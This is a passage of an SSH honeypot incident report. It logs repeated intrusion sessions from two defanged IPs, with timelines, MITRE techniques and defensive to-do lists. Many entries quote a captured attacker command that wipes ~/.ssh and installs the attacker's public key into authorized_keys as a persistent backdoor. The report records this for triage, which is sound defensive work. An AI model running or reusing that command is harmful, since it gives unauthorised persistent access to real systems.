**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56e1afa9b80f

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:23 |
| **Last Seen** | 2026-06-13 07:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:23:56` | `cowrie.session.connect` |
| `2026-06-13 07:23:56` | `cowrie.client.version` |
| `2026-06-13 07:23:56` | `cowrie.client.kex` |
| `2026-06-13 07:23:57` | `cowrie.login.success` |
| `2026-06-13 07:23:58` | `cowrie.session.params` |
| `2026-06-13 07:23:58` | `cowrie.command.input` |
| `2026-06-13 07:23:58` | `cowrie.command.failed` |
| `2026-06-13 07:23:58` | `cowrie.log.closed` |
| `2026-06-13 07:23:58` | `cowrie.session.params` |
| `2026-06-13 07:23:58` | `cowrie.command.input` |
| `2026-06-13 07:23:59` | `cowrie.session.file_download` |
| `2026-06-13 07:23:59` | `cowrie.log.closed` |
| `2026-06-13 07:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-857a6119e7c6

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:24 |
| **Last Seen** | 2026-06-13 07:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:24:02` | `cowrie.session.connect` |
| `2026-06-13 07:24:02` | `cowrie.client.version` |
| `2026-06-13 07:24:02` | `cowrie.client.kex` |
| `2026-06-13 07:24:03` | `cowrie.login.success` |
| `2026-06-13 07:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d085489b73b

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-13 07:25 |
| **Last Seen** | 2026-06-13 07:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:25:21` | `cowrie.session.connect` |
| `2026-06-13 07:25:21` | `cowrie.client.version` |
| `2026-06-13 07:25:21` | `cowrie.client.kex` |
| `2026-06-13 07:25:23` | `cowrie.login.success` |
| `2026-06-13 07:25:23` | `cowrie.session.params` |
| `2026-06-13 07:25:23` | `cowrie.command.input` |
| `2026-06-13 07:25:23` | `cowrie.command.failed` |
| `2026-06-13 07:25:24` | `cowrie.log.closed` |
| `2026-06-13 07:25:24` | `cowrie.session.params` |
| `2026-06-13 07:25:24` | `cowrie.command.input` |
| `2026-06-13 07:25:24` | `cowrie.session.file_download` |
| `2026-06-13 07:25:24` | `cowrie.log.closed` |
| `2026-06-13 07:25:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd8f7037a57e

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-13 07:25 |
| **Last Seen** | 2026-06-13 07:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:25:27` | `cowrie.session.connect` |
| `2026-06-13 07:25:27` | `cowrie.client.version` |
| `2026-06-13 07:25:28` | `cowrie.client.kex` |
| `2026-06-13 07:25:29` | `cowrie.login.success` |
| `2026-06-13 07:25:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a29a800be9a9

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-13 07:27 |
| **Last Seen** | 2026-06-13 07:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:27:02` | `cowrie.session.connect` |
| `2026-06-13 07:27:02` | `cowrie.client.version` |
| `2026-06-13 07:27:02` | `cowrie.client.kex` |
| `2026-06-13 07:27:03` | `cowrie.login.success` |
| `2026-06-13 07:27:04` | `cowrie.session.params` |
| `2026-06-13 07:27:04` | `cowrie.command.input` |
| `2026-06-13 07:27:04` | `cowrie.command.failed` |
| `2026-06-13 07:27:04` | `cowrie.log.closed` |
| `2026-06-13 07:27:05` | `cowrie.session.params` |
| `2026-06-13 07:27:05` | `cowrie.command.input` |
| `2026-06-13 07:27:05` | `cowrie.session.file_download` |
| `2026-06-13 07:27:05` | `cowrie.log.closed` |
| `2026-06-13 07:27:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db39de871722

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-13 07:27 |
| **Last Seen** | 2026-06-13 07:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:27:08` | `cowrie.session.connect` |
| `2026-06-13 07:27:08` | `cowrie.client.version` |
| `2026-06-13 07:27:09` | `cowrie.client.kex` |
| `2026-06-13 07:27:10` | `cowrie.login.success` |
| `2026-06-13 07:27:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-311ff893e6e6

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:30 |
| **Last Seen** | 2026-06-13 07:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:30:06` | `cowrie.session.connect` |
| `2026-06-13 07:30:06` | `cowrie.client.version` |
| `2026-06-13 07:30:07` | `cowrie.client.kex` |
| `2026-06-13 07:30:07` | `cowrie.login.success` |
| `2026-06-13 07:30:08` | `cowrie.session.params` |
| `2026-06-13 07:30:08` | `cowrie.command.input` |
| `2026-06-13 07:30:08` | `cowrie.command.failed` |
| `2026-06-13 07:30:08` | `cowrie.log.closed` |
| `2026-06-13 07:30:09` | `cowrie.session.params` |
| `2026-06-13 07:30:09` | `cowrie.command.input` |
| `2026-06-13 07:30:09` | `cowrie.session.file_download` |
| `2026-06-13 07:30:09` | `cowrie.log.closed` |
| `2026-06-13 07:30:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d1da5465416

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:30 |
| **Last Seen** | 2026-06-13 07:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:30:12` | `cowrie.session.connect` |
| `2026-06-13 07:30:12` | `cowrie.client.version` |
| `2026-06-13 07:30:12` | `cowrie.client.kex` |
| `2026-06-13 07:30:13` | `cowrie.login.success` |
| `2026-06-13 07:30:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64441a07d347

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-13 07:32 |
| **Last Seen** | 2026-06-13 07:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:32:18` | `cowrie.session.connect` |
| `2026-06-13 07:32:18` | `cowrie.client.version` |
| `2026-06-13 07:32:19` | `cowrie.client.kex` |
| `2026-06-13 07:32:20` | `cowrie.login.success` |
| `2026-06-13 07:32:20` | `cowrie.session.params` |
| `2026-06-13 07:32:20` | `cowrie.command.input` |
| `2026-06-13 07:32:20` | `cowrie.command.failed` |
| `2026-06-13 07:32:21` | `cowrie.log.closed` |
| `2026-06-13 07:32:21` | `cowrie.session.params` |
| `2026-06-13 07:32:21` | `cowrie.command.input` |
| `2026-06-13 07:32:22` | `cowrie.session.file_download` |
| `2026-06-13 07:32:22` | `cowrie.log.closed` |
| `2026-06-13 07:32:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec7c81e4606e

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-13 07:32 |
| **Last Seen** | 2026-06-13 07:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:32:25` | `cowrie.session.connect` |
| `2026-06-13 07:32:25` | `cowrie.client.version` |
| `2026-06-13 07:32:25` | `cowrie.client.kex` |
| `2026-06-13 07:32:26` | `cowrie.login.success` |
| `2026-06-13 07:32:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f095edd382b

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-13 07:39 |
| **Last Seen** | 2026-06-13 07:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:39:01` | `cowrie.session.connect` |
| `2026-06-13 07:39:01` | `cowrie.client.version` |
| `2026-06-13 07:39:01` | `cowrie.client.kex` |
| `2026-06-13 07:39:02` | `cowrie.login.success` |
| `2026-06-13 07:39:02` | `cowrie.session.params` |
| `2026-06-13 07:39:02` | `cowrie.command.input` |
| `2026-06-13 07:39:02` | `cowrie.command.failed` |
| `2026-06-13 07:39:03` | `cowrie.log.closed` |
| `2026-06-13 07:39:03` | `cowrie.session.params` |
| `2026-06-13 07:39:03` | `cowrie.command.input` |
| `2026-06-13 07:39:04` | `cowrie.session.file_download` |
| `2026-06-13 07:39:04` | `cowrie.log.closed` |
| `2026-06-13 07:39:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-265e4e399820

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-13 07:39 |
| **Last Seen** | 2026-06-13 07:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:39:07` | `cowrie.session.connect` |
| `2026-06-13 07:39:07` | `cowrie.client.version` |
| `2026-06-13 07:39:07` | `cowrie.client.kex` |
| `2026-06-13 07:39:08` | `cowrie.login.success` |
| `2026-06-13 07:39:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70a96a9b1291

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:40 |
| **Last Seen** | 2026-06-13 07:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:40:14` | `cowrie.session.connect` |
| `2026-06-13 07:40:14` | `cowrie.client.version` |
| `2026-06-13 07:40:14` | `cowrie.client.kex` |
| `2026-06-13 07:40:15` | `cowrie.login.success` |
| `2026-06-13 07:40:15` | `cowrie.session.params` |
| `2026-06-13 07:40:15` | `cowrie.command.input` |
| `2026-06-13 07:40:15` | `cowrie.command.failed` |
| `2026-06-13 07:40:16` | `cowrie.log.closed` |
| `2026-06-13 07:40:16` | `cowrie.session.params` |
| `2026-06-13 07:40:16` | `cowrie.command.input` |
| `2026-06-13 07:40:16` | `cowrie.session.file_download` |
| `2026-06-13 07:40:16` | `cowrie.log.closed` |
| `2026-06-13 07:40:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8630c2426179

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:40 |
| **Last Seen** | 2026-06-13 07:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:40:19` | `cowrie.session.connect` |
| `2026-06-13 07:40:19` | `cowrie.client.version` |
| `2026-06-13 07:40:19` | `cowrie.client.kex` |
| `2026-06-13 07:40:20` | `cowrie.login.success` |
| `2026-06-13 07:40:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57060aa49268

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-13 07:44 |
| **Last Seen** | 2026-06-13 07:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:44:12` | `cowrie.session.connect` |
| `2026-06-13 07:44:12` | `cowrie.client.version` |
| `2026-06-13 07:44:12` | `cowrie.client.kex` |
| `2026-06-13 07:44:13` | `cowrie.login.success` |
| `2026-06-13 07:44:13` | `cowrie.session.params` |
| `2026-06-13 07:44:13` | `cowrie.command.input` |
| `2026-06-13 07:44:13` | `cowrie.command.failed` |
| `2026-06-13 07:44:14` | `cowrie.log.closed` |
| `2026-06-13 07:44:14` | `cowrie.session.params` |
| `2026-06-13 07:44:14` | `cowrie.command.input` |
| `2026-06-13 07:44:15` | `cowrie.session.file_download` |
| `2026-06-13 07:44:15` | `cowrie.log.closed` |
| `2026-06-13 07:44:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5253eaa8e51c

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-13 07:44 |
| **Last Seen** | 2026-06-13 07:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:44:18` | `cowrie.session.connect` |
| `2026-06-13 07:44:18` | `cowrie.client.version` |
| `2026-06-13 07:44:18` | `cowrie.client.kex` |
| `2026-06-13 07:44:19` | `cowrie.login.success` |
| `2026-06-13 07:44:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b5128d39ecf

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:46 |
| **Last Seen** | 2026-06-13 07:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
